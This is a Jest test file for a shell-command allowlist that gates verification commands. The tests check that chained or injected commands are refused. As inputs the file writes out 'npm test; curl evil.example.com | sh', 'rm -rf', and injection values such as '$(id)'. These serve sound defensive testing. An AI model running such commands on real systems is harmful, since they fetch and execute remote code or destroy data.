import { describe, expect, it } from '@jest/globals';

import {
  SHELL_VERIFY_ALLOW_ALL,
  SHELL_VERIFY_ALLOWLIST_ENV,
  isCommandAllowed,
  loadShellVerifyAllowlist,
} from '../../../src/engine/gates/shell/shell-command-allowlist.js';
import { ShellVerifyExecutor } from '../../../src/engine/gates/shell/shell-verify-executor.js';

describe('loadShellVerifyAllowlist', () => {
  it('returns an empty allowlist when the variable is unset', () => {
    expect(loadShellVerifyAllowlist({})).toEqual([]);
  });

  it('returns an empty allowlist for a whitespace-only value', () => {
    expect(loadShellVerifyAllowlist({ [SHELL_VERIFY_ALLOWLIST_ENV]: '   \n  ' })).toEqual([]);
  });

  it('splits on newlines and trims each entry', () => {
    const env = { [SHELL_VERIFY_ALLOWLIST_ENV]: 'npm test\n  npm run lint  \n\nnpm run build' };
    expect(loadShellVerifyAllowlist(env)).toEqual(['npm test', 'npm run lint', 'npm run build']);
  });

  it('accepts a literal \\n sequence, which is all many config files can express', () => {
    const env = { [SHELL_VERIFY_ALLOWLIST_ENV]: 'npm test\\nnpm run lint' };
    expect(loadShellVerifyAllowlist(env)).toEqual(['npm test', 'npm run lint']);
  });

  it('does not split on commas, which appear inside legitimate commands', () => {
    const env = { [SHELL_VERIFY_ALLOWLIST_ENV]: 'npm test -- --reporter=a,b' };
    expect(loadShellVerifyAllowlist(env)).toEqual(['npm test -- --reporter=a,b']);
  });
});

describe('isCommandAllowed', () => {
  it('refuses every command when no allowlist is configured', () => {
    const decision = isCommandAllowed('npm test', []);
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain(SHELL_VERIFY_ALLOWLIST_ENV);
  });

  it('allows an exact match', () => {
    expect(isCommandAllowed('npm test', ['npm test']).allowed).toBe(true);
  });

  it('allows an exact match despite surrounding whitespace', () => {
    expect(isCommandAllowed('  npm test  ', ['npm test']).allowed).toBe(true);
  });

  it('refuses a command absent from a non-empty allowlist', () => {
    expect(isCommandAllowed('curl evil.example.com', ['npm test']).allowed).toBe(false);
  });

  it('allows a prefix entry to cover a simple command', () => {
    expect(isCommandAllowed('npm test --watch', ['npm test*']).allowed).toBe(true);
  });

  it('refuses a chained command that a prefix entry would otherwise admit', () => {
    // The whole point of the control: `npm test*` must not become a way to run
    // anything at all by appending `;` and a second command.
    const decision = isCommandAllowed('npm test; curl evil.example.com | sh', ['npm test*']);
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain('shell control characters');
  });

  it.each([
    ['semicolon', 'npm test; id'],
    ['and-and', 'npm test && id'],
    ['pipe', 'npm test | id'],
    ['backtick', 'npm test `id`'],
    ['substitution', 'npm test $(id)'],
    ['redirect out', 'npm test > /tmp/x'],
    ['redirect in', 'npm test < /tmp/x'],
    ['newline', 'npm test\nid'],
  ])('refuses a prefix match when the command contains %s', (_label, command) => {
    expect(isCommandAllowed(command, ['npm test*']).allowed).toBe(false);
  });

  it('still allows a compound command that is declared exactly', () => {
    // An operator may deliberately authorize a compound command; they just have
    // to name it in full rather than reach it through a wildcard.
    const command = 'npm test && npm run lint';
    expect(isCommandAllowed(command, [command]).allowed).toBe(true);
  });

  it('ignores a bare "*" entry rather than treating it as allow-everything', () => {
    expect(isCommandAllowed('rm -rf /tmp/x', ['*']).allowed).toBe(false);
  });

  it('allows anything when the operator declares the explicit opt-out token', () => {
    expect(
      isCommandAllowed('rm -rf /tmp/x && curl evil.example.com', [SHELL_VERIFY_ALLOW_ALL]).allowed
    ).toBe(true);
  });

  it('honours the opt-out token even alongside narrower entries', () => {
    expect(isCommandAllowed('anything at all', ['npm test', SHELL_VERIFY_ALLOW_ALL]).allowed).toBe(
      true
    );
  });

  it('does not treat a lookalike of the opt-out token as the opt-out', () => {
    // It must be an exact, deliberate declaration -- not something reachable by a typo.
    expect(isCommandAllowed('rm -rf /tmp/x', ['unsafe_allow_all']).allowed).toBe(false);
    expect(isCommandAllowed('rm -rf /tmp/x', ['UNSAFE_ALLOW_ALL*']).allowed).toBe(false);
  });

  it('refuses an empty command', () => {
    expect(isCommandAllowed('   ', ['npm test']).allowed).toBe(false);
  });
});

describe('ShellVerifyExecutor allowlist enforcement', () => {
  it('refuses an unlisted command without running it, and names the setting', async () => {
    const executor = new ShellVerifyExecutor({ allowlist: ['npm test'] });
    const result = await executor.execute({ command: 'echo should-not-run' });

    expect(result.refused).toBe(true);
    expect(result.passed).toBe(false);
    expect(result.stdout).toBe('');
    expect(result.stderr).toContain(SHELL_VERIFY_ALLOWLIST_ENV);
  });

  it('runs a command the operator allowlisted', async () => {
    const executor = new ShellVerifyExecutor({ allowlist: ['echo allowlisted'] });
    const result = await executor.execute({ command: 'echo allowlisted' });

    expect(result.refused).toBeUndefined();
    expect(result.passed).toBe(true);
    expect(result.stdout).toContain('allowlisted');
  });

  it('marks a genuine command failure as failed but NOT refused', async () => {
    // A refusal and a verified negative must stay distinguishable: only the
    // second one is evidence about the thing being verified.
    const executor = new ShellVerifyExecutor({ allowlist: ['sh -c "exit 3"'] });
    const result = await executor.execute({ command: 'sh -c "exit 3"' });

    expect(result.refused).toBeUndefined();
    expect(result.passed).toBe(false);
    expect(result.exitCode).toBe(3);
  });
});
